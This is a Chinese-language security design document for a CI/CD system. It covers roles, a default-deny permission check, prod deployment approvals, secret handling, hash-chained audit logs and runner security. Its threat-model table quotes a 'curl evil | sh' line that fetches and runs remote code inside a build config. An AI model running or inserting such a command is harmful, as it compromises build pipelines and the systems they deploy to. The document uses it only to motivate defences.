# 08 · 权限、审批、密钥与审计

> 回答的问题：**「用户角色权限到底实现了没有、闭环吗？」**
> 结论：没有。现在 `/rbac` 只是能签发/校验 token 的独立资源，**所有写路由（运行、部署、回滚、改配置、改 secret、审批）都不校验身份与角色**（`index.js:2313 requireWrite` 只看 same-origin + `x-dsh-cicd` 头 + `confirm`）。
> 这不是「少一个页签」，而是**信任模型缺失**。

---

## 1. 威胁模型

| 威胁 | 现有防护 | 需要补的 |
|---|---|---|
| 同源页面上任意脚本触发部署 | `x-dsh-cicd` 自定义头（挡简单 CSRF） | 会话 + 角色校验；写操作二次确认绑定具体对象 |
| 低权限用户改 pipe.yml 把 `curl evil \| sh` 塞进构建 | 无 | 配置变更权限 + diff 审计 + 保护分支 |
| 恶意 PR 修改 `pipe.yml` 引入任意 URL 下载（工具链投毒） | 无 | pipe.yml 只允许 vendor 枚举，禁 URL；锁文件校验 |
| 构建日志泄露 secret | 无 | 注入时脱敏、日志落盘前 scrub、`::add-mask::` 等价机制 |
| 审批被自批、被复用、永不过期 | 无 | 禁自批、绑 digest、TTL 4h、一次性 |
| 回滚到被人篡改的旧版本 | 无 | 回滚同样校验 digest 与 provenance |
| Runner 被冒充接入 | join token（sha256 + timingSafeEqual） | 一次性 token、角色最小化、吊销、心跳过期 |
| 事后无法定责 | 有 `operations` 表但只记部分动作 | 全量审计 + 哈希链 |

---

## 2. 身份

### 2.1 三种部署形态

| 形态 | 认证 | 适用 |
|---|---|---|
| `local`（默认） | 本机账号：用户名 + 密码（argon2id）+ TOTP 可选 | 单机 / 个人 |
| `team` | OIDC（GitLab / GitHub / Keycloak / 飞书），映射到内部用户 | 团队 |
| `token` | 长期 API token，**必须带 scope + 过期** | Agent / CLI / CI |

### 2.2 主体分类

| 主体 | 说明 | 默认权限 |
|---|---|---|
| `human` | 登录用户 | 按角色 |
| `service` | 机器身份（部署 token、调度器） | 单项目单环境，短期 |
| `runner` | 构建机 | 只能领任务、回传日志与制品 |
| `anonymous` | 未登录 | 只能读 `public` 项目的运行状态（可选关闭） |

**调度器 / 系统定时任务有独立身份，不算 Admin**——它触发流水线时同样要走 `can()`，并在审计里记 `actor=system:scheduler`。

---

## 3. 授权：最小闭环 3+1 角色

| 角色 | 读运行/日志 | 触发/重跑/取消 | 改配置 | 部署非 prod | 部署 prod | 管 secret | 管成员/环境 |
|---|---|---|---|---|---|---|---|
| **Viewer** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Operator** | ✅ | ✅ | ❌ | ✅ | ❌ | ❌ | ❌ |
| **Admin** | ✅ | ✅ | ✅ | ✅ | ✅（需审批） | ✅ | ❌ |
| **Owner** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| `service` | 按 scope | 按 scope | ❌ | 按 scope | 按 scope + 审批 | ❌ | ❌ |

四条设计规则：

- **R1 四权分立**：读 / 跑 / 改配置 / 批准，是四种不同能力，不能打包成「admin 全都能」。
- **R2 主体分类**：人类、服务、构建机、匿名走不同判定路径，不共用一张表。
- **R3 secret 单向**：写入后不再回显；只在 job 的 env 注入；日志脱敏；`reveal` 需要 Admin + 理由 + 二次批准 + 审计。
- **R4 prod 五条件**（全部满足才允许）：protected env + 允许主体 + 审批通过 + 分支/tag 规则匹配 + artifact digest 校验通过。
- **R5 一决策一审计**：允许**和**拒绝都要落审计。

### 3.1 判定收敛到一个函数

无论内部怎么实现，**所有入口（HTTP / 工具 / webhook / 调度器）必须收敛到**：

```ts
can(actor, action, resource) → { allow: boolean, reason: string, policyId: string }
```

默认拒绝。`resource` 形如 `{ type: 'env', id: 'prod', projectId: 'shop-api' }`。

### 3.2 资源层级与继承

```
org
└── project (shop-api)
    ├── pipeline (default / release)
    ├── environment (dev / staging / prod)
    ├── secret (按 environment 分域)
    ├── runner (可选按 project 绑定)
    └── artifact repo (namespace = project)
```

- 角色授予在 **project** 或 **environment** 级别；未显式授予时不继承上级（避免「org admin 顺手能改所有人 prod」）。
- `prod` 环境默认 `protected = true`，且**只有显式加入 allowlist 的主体**才能部署，即使它是 Owner。

### 3.3 什么时候才需要 ReBAC

Zanzibar 式关系元组（relation tuple + namespace 重写 + Check/Expand + zookie）解决的是：层次继承、对象级共享、反向查询（「列出我能访问的对象」）。

**触发信号（满足 ≥2 条才考虑）**：

1. 需要把单个对象（一条流水线/一个环境）单独共享给某个人；
2. 资源层级 ≥4 层且继承规则 ≥3 条；
3. 权限矩阵开始靠硬编码 if-else 维护；
4. 需要「列出我能访问的对象」这类反向查询；
5. 多租户 + 外部协作者。

本期**不上 ReBAC**，但保留 `can()` 契约——将来替换实现不影响调用方。

---

## 4. 环境与保护规则

```yaml
environments:
  dev:
    protected: false
    requireApproval: false
  staging:
    protected: false
    requireApproval: false
  prod:
    protected: true
    requireApproval: true
    approvers: [ "group:release-managers" ]
    branchRule: "main"                  # 只允许 main 或 v* tag
    tagRule: "v*"
    allowedActors: [ "role:admin", "service:deploy-prod" ]
    autoDeploy:                        # prod-auto 路径
      allowed: false
      requireSignedTag: true
      requireProvenance: true
      window: "Mon-Fri 09:00-18:00"
```

**两种 prod 通道：**

| 通道 | 条件 | 用途 |
|---|---|---|
| `prod-gated` | 人工审批 + TTL | 常规发布 |
| `prod-auto` | 机器身份 + 签名 tag + provenance + 时间窗 | 高频、可回滚、有强测试的团队 |

---

## 5. 审批（最容易做错的部分）

| 规则 | 做法 | 反模式 |
|---|---|---|
| **绑对象** | 审批绑「部署动作 + artifact digest」，不绑 run | 审批挂 run，run 重跑即失效或可复用 |
| **有 TTL** | 默认 4h，到期转 `failed(approval_timeout)` | 无期限，一周前的批准还能用 |
| **禁自批** | 服务端校验 `requested_by != decided_by` | 前端隐藏按钮就算数 |
| **一次性** | 一次审批只对一个 digest 的一次部署生效 | 一次批准 = 这个环境永久放行 |
| **显式拒绝** | 拒绝要带理由；拒绝后同 digest 24h 内不可再提 | 只能「不点」 |
| **紧急通道** | 需理由 + 只对同 digest 生效一次 + 强制通知 + 审计 | 紧急 = 绕过一切 |
| **自动流水线** | 用「条件审批」：满足条件自动通过，**不满足则 fail 而不是 pend** | 无线下人工，流水线永久 pending |

**为什么不能 `when: manual` 当审批**：manual 是「等人点一下继续」，不产生批准记录、不校验谁点的、不可审计、不能 TTL。它是 UI 便利，不是安全控制。

---

## 6. Secret

| 阶段 | 规则 |
|---|---|
| 存储 | KMS/`age` 加密后落盘；DB 只存 ref + 校验和 |
| 写入 | 只写不读；API 返回 `****`；更新需 Admin |
| 注入 | 只进 job 子进程 env，不写文件、不进命令行（避免 `ps` 泄露） |
| 日志 | 落盘前用已注入值做替换脱敏；`***`；命中数记审计 |
| 读取明文 | Admin + 理由 + 二次批准 + 审计事件 `secret.revealed` |
| 作用域 | 按 `environment` 分域，**dev 与 prod 不共享 secret** |
| 轮换 | 支持双版本（current/previous），流水线可指定 `secret_version` |

---

## 7. 审计

### 7.1 必记事件（成功与失败都记）

登录/登出、token 创建与吊销、成员与角色变更、secret 创建/更新/读取/删除/揭示、`pipeline.config_changed`（含 diff 的 hash）、run 触发/取消/重跑、approval 请求/批准/拒绝/超时、deploy 开始/成功/失败/回滚、保护规则变更、runner 注册/吊销/心跳超时、policy deny。

### 7.2 记录字段

```json
{
  "event_id": "evt_01J…",
  "ts": 1763472000123,
  "actor_id": "u_7f3a",
  "auth_method": "session|token|oidc",
  "token_id": "tk_9f2c",
  "on_behalf_of": null,
  "source_ip": "10.0.0.5",
  "user_agent": "dsh/2.0",
  "action": "deploy.activate",
  "resource": { "type": "env", "id": "prod", "project": "shop-api" },
  "result": "allow|deny|error",
  "reason": "approval ap_9f2c",
  "request_id": "req_…",
  "prev_hash": "sha256:…",
  "hash": "sha256:…"
}
```

**哈希链**：`hash = sha256(prev_hash || canonical_json(record))`；append-only + `fsync`；每日把 Merkle root 写到外部（对象存储 / 另一台机），防本地整表重写。

- 保留 ≥1 年；导出 CSV/JSONL 供 SIEM。
- 审计失败不能阻断业务（降级为本地队列 + 告警），但**不能静默丢弃**。

---

## 8. Runner 安全

| 项 | 要求 |
|---|---|
| 注册 | 一次性 join token（默认 1h、单次使用），注册后换长期凭据 |
| 权限 | 只可 `poll/claim/log/artifact/complete`，不可读写配置、不可审批 |
| 隔离 | 建议容器内运行；至少独立系统用户 + 只读挂载源码缓存 |
| 吊销 | Admin 一键吊销；心跳超时 3× 周期自动标 offline |
| 标签 | 能力标签用于调度，见 03 §Runner |
| 版本 | 上报 runner version，过低拒绝领任务 |

---

## 9. 现有代码要改的点

| 位置 | 现状 | 改法 |
|---|---|---|
| `index.js:2313 requireWrite` | 只校验 same-origin + 头 + confirm | 解析会话/token → `can()` → 写审计；`confirm=prod` 不再是唯一护栏 |
| `/rbac` 资源 | 独立签发/校验，不参与业务路由 | 并入统一认证中间件；token 加 scope/expiry 强制校验 |
| `deployLocks`（进程内 Map） | 重启即丢，多进程不互斥 | 落 DB 表 `deploy_locks(target, acquired_by, expires_at)` |
| 审批 | 仅 `approvalRequired && confirmProd` 一个布尔 | 完整审批实体：requested_by/decided_by/reason/TTL/digest |
| secret | `refsForInterpolate` 直接插值进命令 | env 注入 + 日志脱敏 + 揭示审计 |
| 审计 | `operations` 表只记部署动作 | 统一 `audit_log` + 哈希链 |

---

## 10. 接口与验收

```jsonc
// 工具
cicd_whoami → { actor, roles: [{project, env, role}], scopes }
cicd_grant  { project, subject, role, env? }        // Owner
cicd_approve { approvalId, decision: "approve", reason }
cicd_audit  { project, action: "deploy.*", from, to, limit }
```

**验收：**

1. Viewer 调 `cicd_run` → 403 `POLICY_DENY`，且审计里有 deny 记录。
2. Admin 部署 prod 无审批 → `APPROVAL_REQUIRED`；提交后 4h 未批 → `failed(approval_timeout)`。
3. 审批人 = 请求人 → `SELF_APPROVAL_FORBIDDEN`。
4. 用同一审批部署第二个 digest → `APPROVAL_CONSUMED`。
5. 日志里 grep 不到 secret 原文；`secret.revealed` 事件存在。
6. 两条部署并发同一 target → 第二条 `DEPLOY_IN_PROGRESS`（409；落库锁，重启服务后依然如此）。
7. 篡改审计表一行 → `cicd_audit verify` 报链断。
8. 吊销 runner 后 3× 心跳周期内不再被调度。
